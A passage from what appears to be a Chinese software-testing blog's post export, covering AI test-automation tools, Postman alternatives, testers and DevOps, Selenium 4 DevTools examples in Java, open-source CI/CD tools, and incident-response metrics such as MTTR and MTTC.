能够处理多种类型的输入，包括文本（用户的自然语言指令）和图像（应用程序的屏幕截图）。这使 UFO 能够理解当前 GUI 的状态、可用控件和它们的属性，从而做出准确的操作决策。\n4、用户请求解析\n当接收到用户的自然语言指令时，UFO 首先解析这些指令，以确定用户的意图和所需完成的任务。然后，它将这个任务分解成一系列子任务或操作步骤，这些步骤被 AppAgent 和 ActAgent 按顺序执行。\n5、应用程序间的无缝切换\n如果完成用户请求需要多个应用程序的操作，UFO 能够在这些应用程序之间无缝切换。它通过 AppAgent 来决定何时以及如何切换应用程序，并通过 ActAgent 在每个应用程序中执行具体的操作。\n6、自然语言命令到 GUI 操作的映射\nUFO 的核心功能之一是将用户的自然语言命令映射到具体的 GUI 操作上。这一过程涉及到理解命令的意图，识别相关的 GUI 元素，以及生成和执行操作这些元素的动作。\n通过这种方式，UFO 可以自动完成从文档编辑和信息提取到电子邮件撰写和发送等一系列复杂的任务，大大提高用户在 Windows 操作系统中工作的效率和便捷性。\nGitHub：https://github.com/microsoft/UFO\n论文：https://arxiv.org/abs/2402.07939\nUFO 的使用方式其实非常简单，就是想要做什么就用自然语言去发号施令就好了，有兴趣的同学可以试试。\n总结 ai 在自动化测试工具上的探索目前稍显沉闷，并没有杀手级的应用涌现出来。\n事情可以分两面看。\n首先这可能意味着在当前的技术条件下，使用 ai 深度介入自动化测试可能还有一定的困难和壁垒，导致目前实用性很强的应用还没有出现；\n其次这也给我们留下了一定的发挥空间，特别是在创业领域。AI 深度介入自动化测试的应用尚未完全成熟，这反而意味着市场上存在巨大的机会。 创业团队可以抓住这个尚未饱和的市场，开发出真正能够解决实际痛点的 AI 自动化测试产品。\n","date":"2024-10-11T07:53:21+08:00","permalink":"zh.ethanhan.cc/p/ai%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E4%BB%8A%E5%B9%B4%E8%BF%9B%E6%AD%A5%E4%BA%86%E5%A4%9A%E5%B0%91/","title":"AI自动化测试工具今年进步了多少？"},{"content":"又又又看到有人发帖抱怨说 postman 太慢了，想找一款可以替代 postman 的工具。这个需求基本上每隔几个月都会被提出来一次。\n这里顺手总结一下原帖中提到的解决方案，再加上自己的亲身体验，给大家推荐一些 postman 的替代工具。\n反正我坚持认为，postman 只要不登录，速度快点，那么它还是用起来最顺手的 http 请求工具了。\nRapidAPI mac 用户强推了，当年的版本叫 paw，我是花了不少钱买的。现在完全免费了，妥妥的背刺。\nhttps://paw.cloud/\nBruno 开源的轻量 API 测试工具，类似 Postman。\n下载地址: https://www.usebruno.com/。\n主打一个开源以及个人用户不要钱。\nThunder Client 这个是 vscode 的扩展，很轻量，而且免费，用起来不如 postman 顺手。\nRest Client 同样也是 vscode 的扩展，用着还行。\nHoppscotch 今天才之前 Hoppscotch 的前身是之前我们关注过的 postwoman。\n工具地址：https://hoppscotch.io/\n建议直接用 chrome 的扩展，跟当年的 postman 一样。\nInsomnia 另一个类似 Postman 的 API 工具。\n我记得当年是完全开源免费的，现在要收钱了，不过免费的版本完全够用了。\nhttps://insomnia.rest/\nYaak 这个似乎就是 Insomnia 的原作者新写的工具，目前免费。\nhttps://yaak.app/\nJmeter 属于啥都能干，但是体验没有 postman 好了，完全免费，怎么都香。\nhttps://jmeter.apache.org/\nCLI 工具 curl:这个不用多说了 k6: 做性能测试的，用来调 api 其实也行，但是要写代码 requests (Python 库): 要写代码 Playwright API: 还是要写代码 Supertest - 与 Mocha 和 Chai 结合使用的代码测试框架: 继续要写代码 HTTPie: 当年是纯 cli，现在似乎有 desktop 版本了？反正 cli 还是很好用的 Hurl: https://hurl.dev/。看到有人推荐，但没用过，也是cli的 .http 文件 JetBrains .http 文件实现，支持 API 测试的 curl 格式化工具。\n这个我没用过，没有发言权。\n","date":"2024-09-13T09:37:31+08:00","permalink":"zh.ethanhan.cc/p/postman%E6%9B%BF%E4%BB%A3%E5%B7%A5%E5%85%B72024%E7%89%88/","title":"postman替代工具2024版"},{"content":"这确实是个非常值得讨论的话题。\n测试人员究竟是不是需要成为 devops 工程师，我的答案不需要，但又需要。\n测试有时候在开发团队会不被开发同事所重视，甚至有时候会背上效率低下的骂名，我认为其中一个很重要的原因是：测试的工程化程度不高。\n想想开发的一些核心行为\n写设计文档和方案：这个工程化程度不算太高，但是如果是写接口文档，那么很多工具都支持从代码生成文档，这个是可以工程化的； 搭建本地开发环境和测试环境：可以工程化。 写代码：本身代码就是工程化的一环。 构建发布产物：可以工程化。 发布：可以工程化。 监控和告警：可以工程化。 再看测试的核心行为\n用例编写：很难工程化； 用例执行：手工执行用例很难工程化； 测试数据准备和清理：可以工程化； 提出 bug 并进行跟踪：很难工程化； 我们再看看 devops 的概念，DevOps 将软件开发（Dev）和 IT 运维（Ops）的工作进行整合和自动化，旨在提升并缩短系统开发生命周期。\n自动化是 DevOps 中的重要部分。软件程序员和架构师应使用“适应性函数”（fitness functions）来确保他们的软件保持在预期状态。\n简单来说 devops 就是运维工程化，而工程化最好的体现就是运维的自动化。\n测试需要工程化 测试同学其实可以不用成为专职的 devops 工程师，毕竟这是另一个研发角色，负责的内容和范围也不太一样。\n但是测试同学确实是可以借鉴 devops 文化中的工程化思想，让测试变得更具工程化一些。\n然而我们看到，核心的一些测试行为确实很难进行工程化，这样一来，我们就需要扩大我们的工作半径，将一切可以提升质量的行为都纳入到我们的工作职责中来，而这一系列的行为里，有一部分是可以进行工程化的。\n最典型的可以进行工程化质量实践就是构建 ci/cd 流水线。\n测试同学可以通过构建 ci/cd 流水线进行自动化的准出测试，如果对代码库的 precommit hook 进行工程化定制的话，还可以对准入进行控制。\n流水线的输入是代码，输出也是代码，其中执行的各种任务也都是代码实现的，所以如果测试同学想要构建一条对质量有所裨益的流水线，那么下面的一些技能还是需要具备的。\n一定的代码能力 一定的工具整合能力，ci/cd 的工具很多，有时候我们不需要开发，只需要接入和定制就好 一定的质量规划能力，加什么准入和准出？如何保证各种检查不会拖慢流水线的执行？ 小结 简单来说，会代码，有工程化思想，有构建高质量产出物的工具和思路，这类的测试同学应该还是会受欢迎的。\n但不要忘了，测试同学的核心任务还是质量保障，ci/cd 只是质量保障的一种实践，而不是质量管理的全部。\n其他人的观点 最近看到了一篇文章对测试人员要不要成为 devops 人员进行了讨论，这里顺便放上来，供大家参考。\n原文地址: https://visible-quality.blogspot.com/2024/09/do-testers-need-to-be-devops-engineers.html\n在我职业生涯的某个阶段，我逐渐专注于理解测试环境。这一切始于观察子系统之间的关联，以及识别哪些数据可以兼容。在保险行业，进行有效测试没有其他选择，尤其是当时一个新的 IBM 大型机测试环境的搭建就耗费了 100 万和一年的时间（我也经历过）。我已经不太记得那时用的货币是芬兰马克还是欧元了，只记得那种对项目的巨大责任感，因为我需要确保这个耗资百万的项目能够顺利进行。那段经历让我从此更加重视测试环境，不仅对工作站、服务器和版本有了更清晰的分类，处理这些事情也变成了日常工作的一部分。\n当云计算后来进入我的工作领域时，这种对测试环境的分类和基础知识变得更加重要。了解存储、计算和专业服务的位置，设置这些分布式服务之间的连接和依赖关系，再结合我们已有的控制手段，以及那些我们意识到但无法控制的部分，极大地帮助我搞清楚自己在测试什么。\n当时，我很容易判断出新项目的测试环境在每周的早期会比较顺畅，但随着时间推进，问题会逐渐显现。我能分辨出哪些症状是由于测试环境规模过小，哪些是由于数据和内存问题引起的，进而根据每周、每天的节奏调整测试方式。\n今天我在思考这些问题时，看到有人问测试人员是否需要理解 CI/CD，以及在这方面需要具备哪些具体技能。\n我的很多同事在测试自动化领域深耕后，逐渐走上了 CI/CD 流水线的道路。他们意识到，手动在自己电脑上运行的程序化测试并不能真正实现自动化。只有在变更之后立即运行测试，才能最大化其价值，而这需要将测试设计融入 CI/CD 流水线中。许多同事每周只有不到一天的时间进行实际测试，而随着测试每晚自动化运行，测试环境逐渐演变为通过 Docker 进行编排的架构平台，基础设施的任何变更都需要通过修改代码来完成（即基础设施即代码）。\n我依然会与一些对测试环境理解停留在我当年水平的测试人员合作。他们能区分出两个相同但地址不同的测试环境，并根据经验法则判断应该关注哪些问题。像我当初一样，他们依靠特定的时间模式来控制测试时遇到的版本。这类测试人员可能会设计出不允许变更的环境，因为安装环境常常不可用或超出他们的控制范围。他们需要了解 CI/CD 作为发布和调度的机制，但无需深入理解其内部运作。\n如今，我越来越多地与那些设计并优化流水线的测试人员合作。他们不一定亲自完成所有更改，但需要能够读懂流水线，了解其中的运作。流水线中的错误往往决定了他们一天的工作内容，他们需要找到错误的根源。大多数人只是在已有范例的基础上配置新的作业，而少有人会去创新引入新工具。然而，很多人似乎非常喜欢这一部分工作。\n此外，还有一些人专注于流水线本身。测试对于他们来说只是一种占位符，他们很少有时间考虑测试的覆盖范围。他们的工作就是围绕流水线展开，让流水线在更好的基础设施上运行，添加新工具，升级现有工具，构建支持团队的各种设备。这些人即使有测试背景，也往往会称自己为 DevOps 工程师，以突出他们对基础设施和流水线的关注。\n在招聘测试人员时，你可能会遇到不同层次的技能水平。许多人追求中间地带的平衡，我们也越来越希望招聘到那些既掌握流水线赋予测试环境的控制手段，又能有效进行测试的人。\n与此同时，我们也在寻找一种平衡，既要求人们具备足够的知识，又能专注于测试工作，而不仅仅是维护流水线。\n","date":"2024-09-13T08:50:52+08:00","permalink":"zh.ethanhan.cc/p/%E6%B5%8B%E8%AF%95%E4%BA%BA%E5%91%98%E9%9C%80%E8%A6%81%E6%88%90%E4%B8%BAdevops%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%90%97/","title":"测试人员需要成为devops工程师吗"},{"content":"selenium 4 的新功能，不是非常惊喜，不过确实比较实用了。\n在瞬息万变的网络自动化领域,Selenium 一直是主要参与者。随着 Selenium 4 的发布,其功能得到进一步增强,引入了前沿特性,简化了测试流程并提高了效率。Chrome DevTools 和 BiDi API 的集成不仅增强了selenium的技术能力,还为管理自动化项目的经理们带来了战略价值。\nChrome DevTools 协议:深入浏览器自动化 Selenium 4 与 Chrome DevTools 协议 (CDP) 的集成为自动化测试人员开启了无限可能。通过直接与浏览器底层协议交互,CDP 实现了全面的网络和性能监控、控制台日志访问以及高级调试能力。\n想象一下,你需要测试应用在不同网络条件下的表现。利用 CDP,你可以模拟各种网络速度,分析应用如何处理缓慢或不稳定的连接。这一功能确保你的网络应用具有韧性,能够为各种网络条件下的用户提供最佳性能。\nCDP 还支持以下强大功能:\n模拟网络条件: 模拟离线模式、慢速网络等情况,测试应用的适应能力 访问控制台日志: 直接捕获和分析控制台日志,便于调试和验证 JavaScript 错误 性能指标: 收集详细的性能指标,识别瓶颈并优化加载时间 安全测试: 监控和操作 cookie,追踪混合内容等安全问题,验证 HTTPS 配置 启用网络拦截的示例代码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public class ChromeDevToolsExample { public static void main(String[] args) { System.setProperty(\u0026#34;webdriver.chrome.driver\u0026#34;, \u0026#34;path/to/chromedriver\u0026#34;); ChromeOptions options = new ChromeOptions(); ChromeDriver driver = new ChromeDriver(options); DevTools devTools = driver.getDevTools(); devTools.createSession(); // 启用网络 devTools.send(Network.enable(Optional.empty(), Optional.empty(), Optional.empty())); // 添加网络请求监听器 devTools.addListener(Network.requestWillBeSent(), request -\u0026gt; { System.out.println(\u0026#34;请求 URL: \u0026#34; + request.getRequest().getUrl()); }); driver.get(\u0026#34;https://www.example.com\u0026#34;); driver.quit(); } } 在这个例子中,我们启用了网络拦截来捕获浏览器发出的所有网络请求。这对于验证是否发出了正确的网络请求以及调试资源加载问题特别有用。\nBiDi API: 实时交互实现敏捷测试 双向 (BiDi) API 引入了客户端和浏览器之间的双向通信渠道,实现了实时交互和更快速的测试自动化。这项功能对于处理异步操作和确保动态、实时更新至关重要。\n设想一个场景,你需要验证网页在某个用户操作(如点击按钮或填写表单)后发生的变化。使用 BiDi API,你可以发送命令并立即评估结果,无需等待整个页面重新加载,从而使测试更快、更高效。\nBiDi API 的其他重要特性包括:\n实时 DOM 操作: 直接实时交互和操作 DOM,支持高级测试场景 异步事件处理: 异步处理网络请求或 DOM 更新等事件,提高测试可靠性 实时反馈: 对浏览器操作获得即时反馈,增强测试过程的敏捷性 会话管理: 更有效地管理浏览器会话,提高对测试环境的控制 BiDi 实现的示例代码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public class BiDiExample { public static void main(String[] args) { System.setProperty(\u0026#34;webdriver.chrome.driver\u0026#34;, \u0026#34;path/to/chromedriver\u0026#34;); ChromeOptions options = new ChromeOptions(); ChromeDriver driver = new ChromeDriver(options); DevTools devTools = driver.getDevTools(); devTools.createSession(); // 使用 BiDi API 执行 JavaScript 代码 Runtime.EvaluateParameters params = new Runtime.EvaluateParameters(\u0026#34;document.title\u0026#34;); String result = devTools.send(Runtime.evaluate(params)).getResult().getValue().toString(); System.out.println(\u0026#34;页面标题: \u0026#34; + result); driver.quit(); } } 在这里,我们使用 BiDi API 评估一个 JavaScript 表达式来获取文档标题。这允许我们在用户操作或事件发生后立即对页面状态进行实时验证。\n实时 DOM 操作的示例代码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 public class LiveDOMManipulation { public static void main(String[] args) { ChromeOptions options = new ChromeOptions(); WebDriver driver = new ChromeDriver(options); DevTools devTools = ((ChromeDriver) driver).getDevTools(); devTools.createSession(); driver.get(\u0026#34;https://example.com\u0026#34;); WebElement element = driver.findElement(By.id(\u0026#34;elementId\u0026#34;)); // 启用 DOM devTools.send(DOM.enable()); // 获取节点 ID int nodeId = devTools.send(DOM.getDocument()).getRoot().getNodeId(); // 使用 CDP 设置背景颜色 devTools.send(DOM.setAttributeValue(nodeId, \u0026#34;style\u0026#34;, \u0026#34;background-color: yellow;\u0026#34;)); // 向 DOM 添加新元素 String script = \u0026#34;let newElement = document.createElement(\u0026#39;div\u0026#39;); newElement.innerHTML = \u0026#39;Hello, World!\u0026#39;; document.body.appendChild(newElement);\u0026#34;; ((ChromeDriver) driver).executeScript(script); driver.quit(); } } 拦截网络请求的代码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public class NetworkActivity { public static void main(String[] args) { // 设置 ChromeDriver 和 DevTools ChromeOptions options = new ChromeOptions(); WebDriver driver = new ChromeDriver(options); DevTools devTools = ((ChromeDriver) driver).getDevTools(); devTools.createSession(); // 启用网络跟踪 devTools.send(Network.enable()); // 添加请求和响应监听器 devTools.addListener(Network.requestWillBeSent(), request -\u0026gt; { Request req = request.getRequest(); System.out.println(\u0026#34;请求 URL: \u0026#34; + req.getUrl()); System.out.println(\u0026#34;请求方法: \u0026#34; + req.getMethod()); }); devTools.addListener(Network.responseReceived(), response -\u0026gt; { Response res = response.getResponse(); System.out.println(\u0026#34;响应 URL: \u0026#34; + res.getUrl()); System.out.println(\u0026#34;响应状态: \u0026#34; + res.getStatus()); }); // 导航到网站 driver.get(\u0026#34;https://www.example.com\u0026#34;); // 关闭浏览器 driver.quit(); } } 获取性能指标\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 public class PerformanceMetricsOverTime { public static void main(String[] args) { // 设置 ChromeDriver 和 DevTools ChromeOptions options = new ChromeOptions(); WebDriver driver = new ChromeDriver(options); DevTools devTools = ((ChromeDriver) driver).getDevTools(); devTools.createSession(); // 启用性能监控 devTools.send(Performance.enable()); // 导航到网站 driver.get(\u0026#34;https://www.example.com\u0026#34;); // 定时器每5秒捕获一次性能指标 Timer timer = new Timer(); timer.schedule(new TimerTask() { @Override public void run() { List\u0026lt;Metric\u0026gt; metrics = devTools.send(Performance.getMetrics()); System.out.println(\u0026#34;捕获的性能指标:\u0026#34;); for (Metric metric : metrics) { System.out.println(metric.getName() + \u0026#34;: \u0026#34; + metric.getValue()); } System.out.println(); } }, 0, 5000); // 初始延迟0毫秒,每5000毫秒(5秒)重复一次 // 运行测试一段特定时间(例如1分钟)然后停止 try { Thread.sleep(60000); // 运行60秒 } catch (InterruptedException e) { e.printStackTrace(); } // 停止定时器并关闭浏览器 timer.cancel(); driver.quit(); } } 采用 Selenium 4 的新特性带来了几项战略优势:\n提高测试准确性: 与 Chrome DevTools 的深度集成确保了更精确、更可靠的测试,减少了出错的可能性 改进性能监控: 管理者现在可以监控详细的性能指标,能够主动识别和解决瓶颈问题 灵活高效的测试环境：BiDi API 实现了即时反馈和动态交互，打造出反应迅速、适应性强的测试体系。这种环境能够快速响应变化，使测试过程更加敏捷灵活。 来源 原文地址\n","date":"2024-08-07T12:23:16+08:00","permalink":"zh.ethanhan.cc/p/%E5%85%85%E5%88%86%E5%8F%91%E6%8C%A5-selenium-4-%E7%9A%84%E6%BD%9C%E5%8A%9B/","title":"充分发挥 Selenium 4 的潜力"},{"content":"现在很多测试岗位需要测试同学有CI/CD流水线的搭建经验，这里给大家推荐一下常用的7大CI/CD工具，覆盖了代码管理，ci/cd集成，静态代码扫描，容器安全扫描，测试用例管理，性能测试等方向，值得收藏。\nSonarQube: 代码质量的守护者 SonarQube 是一款卓越的代码质量和静态分析工具。\n它通过发现 bug、漏洞和代码质量隐患,帮助开发者维护高水平的代码标准。SonarQube 凭借其直观的界面和全面的报告,确保您的代码库保持整洁和易于维护。\n我采访过的许多专家都表示,我会喜欢上 SonarQube,因为它能帮助改进代码并推广良好的编码习惯。\nSonarQube 的优点:\n静态代码分析 检测 bug 和漏洞 追踪代码质量隐患 生成全面的质量报告 目前在 GitHub 上拥有 8.8k 星标。\nGitLab: 一体化 DevOps 平台 GitLab 不仅仅是版本控制工具。\n我交流过的专家认为,它是一个完整的 DevOps 平台,包含 CI/CD 流水线,为众多团队提供一站式解决方案。此外,GitLab 的集成方式简化了工作流程,增强了开发和运维团队之间的协作。\nGitLab 的优点:\n集成版本控制 内置 CI/CD 流水线 协作开发环境 精简的 DevOps 工作流程 目前在 GitHub 上拥有 5.1k 星标。\nGitleaks: 保护密码信息 在 DevOps 中,安全至关重要,Gitleaks 可以扫描和检测代码中的硬编码密码。这个工具有助于防止 API 密钥和密码等敏感信息意外泄露,提高整体安全水平。\nGitleaks 的优点:\n扫描硬编码密码 防止敏感信息泄露 与 Git 仓库无缝集成 提升整体安全性 目前在 GitHub 上拥有 19.9k 星标。\nCloc: 跟踪您的代码库 虽然概念简单,但 Cloc(代码行数统计)对于了解项目的规模和复杂性非常有价值。它提供的结果有助于项目规划、资源分配和复杂度管理。\nCloc 的优点:\n统计代码行数 提供项目复杂性洞察 辅助资源分配 支持多种编程语言 目前在 GitHub 上拥有 19k 星标。\nTrivy: 确保容器安全 随着容器化的普及,Trivy 成为容器和应用程序漏洞扫描的重要工具。它能识别容器镜像和应用程序中的安全问题,确保您的部署从根本上保证安全。\nTrivy 的优点:\n扫描容器镜像中的漏洞 识别应用程序中的安全问题 支持各种操作系统包和特定语言的依赖项 提供全面的漏洞报告 目前在 GitHub 上拥有 22.4k 星标。\nDefectDojo: 集中安全洞察 DefectDojo 整合了各种安全扫描的结果,提供应用程序安全状态的全局视图。对于希望简化安全流程并全面了解安全状况的团队来说,这个工具不可或缺。\nDefectDojo 的优点:\n整合安全扫描结果 提供应用程序安全的整体视图 简化漏洞管理 支持与各种安全工具集成 目前在 GitHub 上拥有 3.5k 星标。\nK6: 确保高负载下的性能 性能测试在 CI/CD 流水线中至关重要,K6 在这一领域表现出色。它让开发人员能轻松创建和运行性能测试,确保应用程序能够应对预期负载甚至更高负载。\n在一次自动化分享大会上,Nicole van der Hoeven 将 k6 描述为主要用于负载测试的开源工具。它用 Go 语言编写,因此比 Java 等传统语言具有更多性能优势。\n它是开源的,对开发人员和测试人员都很友好,而且脚本语言是 JavaScript,所以比学习 Go 更容易上手。最重要的是,K6 是一个多功能工具,可用于编写基于协议的负载测试脚本和基于浏览器的测试脚本。\nk6 的优点:\n创建和运行性能测试 模拟各种负载场景 提供详细的性能指标 易于与 CI/CD 流水线集成 目前在 GitHub 上拥有 24.1k 星标。\n总结 你推荐哪些 DevOps 质量工具?\n那么,我还漏掉了什么?请告诉我。\n如我所说,我知道选择很多,但将这些开源工具整合到你的 CI/CD 流水线中是个不错的起点。这些工具涵盖了现代软件开发工作流程的各个方面,从代码质量和安全性到性能和功能测试。\n请记住,选择合适的工具并有效地将其融入你的流程中对于成功实施 DevOps 至关重要。从解决最紧迫需求的工具开始,随着团队专业知识的积累,逐步扩展你的工具箱。\n借助这些强大的开源解决方案,你可以构建更高效、更安全、更稳健的 CI/CD 流水线,最终实现更快速、更高质量的软件发布。\n","date":"2024-08-07T10:47:01+08:00","permalink":"zh.ethanhan.cc/p/7%E5%A4%A7%E5%BC%80%E6%BA%90-ci/cd-%E5%B7%A5%E5%85%B7-2024%E7%89%88%E6%9C%AC/","title":"7大开源 CI/CD 工具 2024版本"},{"content":"最近业界比较流行面向指标的开发，据我所知在一些大厂，所有的开发过程指标和结果指标都要被明确定义出来并进行统计。\n这里无意去罗列各种过程指标和结果指标，只想稍微分享一下跟线上事故相关的几个指标。\n事故量度指标 事故量度指标帮助我们评估整个系统的表现。它们通过事故数量和时间频率,反映了系统的可靠性。然而,事故量度指标并不能让我们知晓我们对事故预案的准备程度。\n✅ 告警转化率(Alert-to-Incident Ratio) 这个指标也被称为告警转换率，它对团队的健康状况至关重要。虽然我们强调快速响应每一个告警的重要性，但过多的告警可能会适得其反。当告警数量过多时，团队成员可能会产生\u0026quot;告警疲劳\u0026quot;，这不仅会影响团队的整体效率，还可能削弱我们的可靠性策略。\n长期处于高压状态下的团队成员容易感到精疲力竭，当真正严重的事故发生时，他们可能无法以最佳状态应对。这就是为什么我们需要密切关注告警转换率的原因。\n如果我们发现大量告警最终并未演变成实际事故，那就意味着我们需要重新审视告警机制了。找到合适的平衡点并非易事，这需要我们不断调整和优化可观测性工具链。正因如此，持续监控和分析告警转换率变得尤为重要，它能帮助我们及时发现问题，并做出必要的调整。\n👻 单位时间事故数(Incidents Over Time) 这个指标简单地统计了特定时期内的事故发生次数。虽然看似直观，但单独使用时往往缺乏深度洞察。有趣的是，这个数据常常引起SRE团队之外人员的关注，但我们要警惕它可能变成一个华而不实的指标。\n需要注意的是，某个月份或季度的事故数量并不能直接反映系统的可靠性。这些数字的波动可能与业务的季节性特点有关，或者受到一些我们无法掌控的外部因素影响。\n不过，跟踪事故数量的变化趋势确实有其价值。它能帮助我们评估当前的值班安排是否合理，以及是否需要增加人手支持。为了保护团队不被过度劳累，很多公司都会设定每个值班轮次最多处理2起事故的上限。这种做法既能确保及时响应，又能避免团队成员疲惫不堪。\n✅ 平均故障间隔时间(MTBF) Mean Time Between Failures\nMTBF（平均故障间隔时间）是一个重要的可靠性指标，它计算的是系统或某个组件在两次故障之间的平均时间。想象一下工厂里的安全记分牌，上面记录着\u0026quot;已安全运行天数\u0026quot;，MTBF的概念与之类似。这个指标之所以能够很好地反映系统可靠性，是因为它直观地展示了系统出现故障的频率。\nMTBF的应用非常广泛。通过分析这个指标，我们可以：\n对系统未来的可靠性进行预测 制定更加合理的预防性维护计划 比较不同组件的可靠性表现 特别值得注意的是，当我们发现某些组件的MTBF明显低于其他部分时，这就为我们提供了强有力的数据支持。利用这些数据，我们可以说服相关方投入资源，对这些问题频发的组件进行深入分析和改进。这种数据驱动的决策方法，能够帮助我们更加精准地提升系统的整体可靠性。\n事故响应指标 事故响应指标是衡量我们处理事故能力的重要标尺。通过这些指标，我们可以清晰地看到团队在应对事故时的表现，同时也能发现我们的工具链中可能存在的不足之处。这些洞察为我们持续改进事故响应流程提供了方向。\n👻 平均确认时间（MTTA） Mean Time To Acknowledge\n想知道你的团队对告警的反应有多快吗？平均确认时间（MTTA）就是答案。这个指标精确地测量了从系统发出告警到团队成员确认接收之间的时间。\n虽然MTTA是个重要指标，但它更多地反映了你的值班系统的设置是否合理。如果你发现MTTA高于预期，那可能就需要重新审视你的值班轮换安排和升级策略了。\n不过，使用MTTA时要小心，因为它容易被值班工程师\u0026quot;钻空子\u0026quot;。如果你为MTTA设定了具体目标，工程师们可能会为了达标而快速确认告警，但这并不能保证他们会有效地处理整个事故直到解决。换句话说，快速确认不等于高效解决。\n因此，在使用MTTA时，我们需要全面考虑，将其与其他指标结合使用，以获得更全面的事故响应效率评估。\n✅ 平均解决时间（MTTR） Mean Time To Resolve\n在所有事故响应指标中，MTTR无疑是当之无愧的明星。它代表平均解决、恢复或修复时间。几乎所有推销SRE相关工具的人都会强调MTTR的重要性，因为从一线事故指挥到高层管理，每个人都关心一个核心问题：我们能多快解决问题？\nMTTR计算的是从确认事故到最终解决的平均时间。它之所以如此重要，是因为它直接反映了我们处理事故的效率。更快的MTTR意味着更少的收入损失，更高的客户满意度，更好的品牌形象，以及更低的SLA违约风险。\n然而，MTTR也有其局限性。它只能告诉我们解决问题的总时间，却无法展示事故处理过程中的具体细节。要真正提高效率，我们需要深入分析，找出流程中的瓶颈，并针对性地进行改进。\n✅ 平均事故响应时间（AIRT） Average Incident Response Time\n别被这个名字迷惑了。AIRT并不是指解决问题的时间，而是将事故分配给最合适的团队成员所需的时间。\n有趣的是，很多公司发现，他们的MTTR中有相当大一部分时间其实花在了组建合适的响应团队上。这个发现让人意识到了AIRT的重要性。\n但是，提高AIRT并非易事。它需要我们能够快速准确地诊断事故性质，这就要求响应人员具备出色的日志分析和问题追踪能力。\n一些前沿公司已经开始在这方面应用人工智能技术。比如，有的公司使用AI来识别曾经解决过类似问题的团队成员。还有像Meta这样的公司，则利用AI来快速定位可能导致当前事故的代码变更。\n✅ 平均遏制时间（MTTC） Mean Time To Contain\nMTTC这个概念源自安全领域，一个经常需要处理最棘手事故的领域。它衡量的是从事故开始到彻底解决的全过程时间。\n具体来说，MTTC包含了三个阶段的时间：问题检测时间（MTTD）、确认时间（MTTA）和解决时间（MTTR）。\n通过分析MTTC，我们可以全面了解系统中潜在威胁的生命周期，评估其可能造成的影响，从而制定更有针对性的防御策略。\n这些指标互相补充，共同构成了一个全面的事故响应评估体系。通过持续监控和优化这些指标，我们可以不断提升团队的事故处理能力，最终达到更高的系统可靠性。\n业务指标 事故的影响远不止于技术层面，它可能会引发一系列连锁反应，从收入损失到法律风险，再到合规问题。因此，负责系统可靠性的领导者们不仅要关注技术指标，还需要密切关注一些反映成本和业务价值的指标。以下是几个关键指标：\n👻 值班时间 值班制度正在发生变革。过去，很多公司并不为值班时间支付额外报酬，但现在越来越多的组织开始重视这一点。除了遵守某些地区的劳动法规定外，提供值班补贴也能激励员工更积极地响应警报，更有效地解决问题。\n当引入补贴机制后，值班人数的安排就变得更加重要了。通常，我们会设置多级响应策略，每个级别可能安排多名值班人员。\n不过，值班时间本身通常只是一个参考数据。实际的值班安排、轮换计划和升级策略，往往需要综合考虑系统特性、业务需求和可用人力等因素。如果公司决定提供额外的值班补贴，这部分费用通常已经包含在员工薪酬预算中。\n✅ 系统正常运行时间 System Uptime\n说到可靠性，系统正常运行时间可以说是最直观、最重要的指标。它表示系统正常工作的时间占总时间的百分比。显然，这个数字越接近100%，客户和其他利益相关者就越满意。\n但现实世界中，100%的正常运行时间几乎是不可能的。因此，我们需要持续监控实际的正常运行时间，及时发现并解决潜在问题。\n值得注意的是，系统正常运行时间经常被用作营销亮点，在一些要求高可靠性的合同中，它还可能被写入服务级别协议（SLA）。\n✅ SLA和SLO合规性 在SRE（网站可靠性工程）领域，SLA（服务级别协议）和SLO（服务级别目标）是两个核心概念，它们构成了一个复杂而重要的研究领域。\nSLA是我们对客户的承诺，它具有法律约束力，详细规定了我们承诺提供的服务质量和可用性水平。\n相比之下，SLO更多是用于内部管理。它代表了我们希望达到的理想目标，通常会比SLA留有一定的余地，我们称之为\u0026quot;误差预算\u0026quot;。这样的设计既能保证我们履行对客户的承诺，又为团队提供了一定的操作空间。\n通过持续监控和优化这些指标，我们能更好地平衡技术实现与业务目标，最终为公司创造更大的价值。\n超越指标理解事故 指标和KPI（关键绩效指标）无疑是评估系统可靠性的重要工具。它们让我们能够清晰地看到我们的可靠性实践如何随着时间推移和规模变化而表现。这些数据为我们提供了宝贵的洞察，帮助我们了解系统的整体健康状况。\n然而，我们也要意识到，单纯依赖这些数字可能会让我们陷入一种假象。现实世界是复杂和不可预测的，有时会发生一些罕见但影响深远的事件，我们常称之为\u0026quot;黑天鹅事件\u0026quot;。这类事件可能会突然出现，彻底打乱我们的所有预期。同样，公司内部的重大战略调整也可能导致这些指标发生剧烈变化。\n正是因为这种不确定性和变化的存在，我们不能仅仅停留在表面的数字上。要真正理解SRE（网站可靠性工程）团队的工作状况和流程的有效性，我们需要深入到日常工作的细节中去。\n来源 原文其实是个软文来着，我去掉了广告，可以放心食用。\n思考 MTTR和MTTC的区别 这些指标里有两个我是分不清楚的，那就是MTTR和MTTC，所以我直接问了一下AI，这是AI给出的参考答案。\nMTTR（平均修复时间）和MTTC（平均遏制时间）是两个重要但有所不同的可靠性指标。让我们深入了解它们的区别：\n定义：\nMTTR（Mean Time To Repair/Resolve）：指从确认问题到完全解决问题的平均时间。 MTTC（Mean Time To Contain）：指从问题开始到问题被控制（但不一定完全解决）的平均时间。 范围：\nMTTR 专注于问题的完全解决。 MTTC 包括了更广的时间范围，通常涵盖从问题检测（MTTD）、确认（MTTA）到初步控制的整个过程。 目标：\nMTTR 的目标是尽快恢复正常服务。 MTTC 的目标是尽快控制问题的影响范围，防止进一步扩散。 应用场景：\nMTTR 常用于评估IT运维和支持团队的效率。 MTTC 更多地用在安全领域，特别是在处理安全事件时。 组成部分：\nMTTR 通常只包括从确认到解决的时间。 MTTC 通常包括检测时间（MTTD）+ 确认时间（MTTA）+ 初步控制时间。 关注点：\nMTTR 更关注最终结果——问题的彻底解决。 MTTC 